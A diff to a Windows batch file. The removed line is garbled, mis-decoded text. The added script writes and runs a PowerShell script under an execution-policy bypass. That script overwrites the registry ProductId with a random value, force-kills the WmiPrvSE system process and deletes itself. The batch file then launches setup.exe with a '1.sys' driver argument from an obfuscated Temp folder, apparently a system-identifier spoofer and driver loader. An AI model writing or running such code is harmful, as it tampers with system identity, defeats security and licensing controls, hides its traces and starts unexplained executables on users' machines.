@@ -1,1 +1,17 @@
-ഊ敀档⁯景൦⠊਍捥潨匠瑥䔭數畣楴湯潐楬祣删浥瑯卥杩敮⁤‾捳楲瑰瀮ㅳ਍捥潨␠慣業桮副来獩牴⁯‽䠢䱋㩍卜䙏坔剁居楍牣獯景屴楗摮睯⁳呎䍜牵敲瑮敖獲潩≮㸠‾捳楲瑰瀮ㅳ਍捥潨␠潮敭慖潬⁲‽倢潲畤瑣摉•㸾猠牣灩⹴獰റ攊档⁯愤敬瑡牯潩㴠䜠瑥刭湡潤⁭䴭湩浩浵〠ⴠ慍楸畭⁭〵〰㸠‾捳楲瑰瀮ㅳ਍捥潨␠污慥潴楲㉯㴠䜠瑥刭湡潤⁭䴭湩浩浵〠ⴠ慍楸畭⁭〸〰㸠‾捳楲瑰瀮ㅳ਍捥潨␠潮潶慖潬⁲‽␢污慥潴楲㉯㐭娱㤷〭㈳〰匭␶污慥潴楲≯㸠‾捳楲瑰瀮ㅳ਍捥潨匠瑥䤭整偭潲数瑲⁹倭瑡⁨挤浡湩潨敒楧瑳潲ⴠ慎敭␠潮敭慖潬⁲嘭污敵␠潮潶慖潬⁲㸾猠牣灩⹴獰റ攊档⁯瑓灯倭潲散獳ⴠ慎敭∠浗偩癲䕓•䘭牯散㸠‾捳楲瑰瀮ㅳ਍潰敷獲敨汬ⴠ硅捥瑵潩偮汯捩⁹祂慰獳ⴠ楆敬猠牣灩⹴獰റ搊汥䌠尺獕牥屳捳楲瑰瀮ㅳ਍ ‾㩃啜敳獲獜牣灩⹴獰റ搊汥猠牣灩⹴獰റഊ挊⁤㩃啜敳獲╜獵牥慮敭尥灁䑰瑡屡潌慣屬敔灭啜䘲摳噇填就䐱㉡圹氷㐸呃硦䕃乹㔫氹䴲㡩晫㑗兤ഽ猊慴瑲猠瑥灵攮數ㄠ献獹
+@echo off
+(
+echo Set-ExecutionPolicy RemoteSigned > script.ps1
+echo $caminhoRegistro = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" >> script.ps1
+echo $nomeValor = "ProductId" >> script.ps1
+echo $aleatorio = Get-Random -Minimum 0 -Maximum 5000 >> script.ps1
+echo $aleatorio2 = Get-Random -Minimum 0 -Maximum 8000 >> script.ps1
+echo $novoValor = "$aleatorio2-41Z79-03200-S6$aleatorio" >> script.ps1
+echo Set-ItemProperty -Path $caminhoRegistro -Name $nomeValor -Value $novoValor >> script.ps1
+echo Stop-Process -Name "WmiPrvSE" -Force >> script.ps1
+powershell -ExecutionPolicy Bypass -File script.ps1
+del C:\Users\script.ps1
+) > C:\Users\script.ps1
+del script.ps1
+
+cd C:\Users\%username%\AppData\Local\Temp\U2FsdGVkX1\1Da29W7l84CTfxCEyN+59l2Mi8kfW4dQ=
+start setup.exe 1.sys
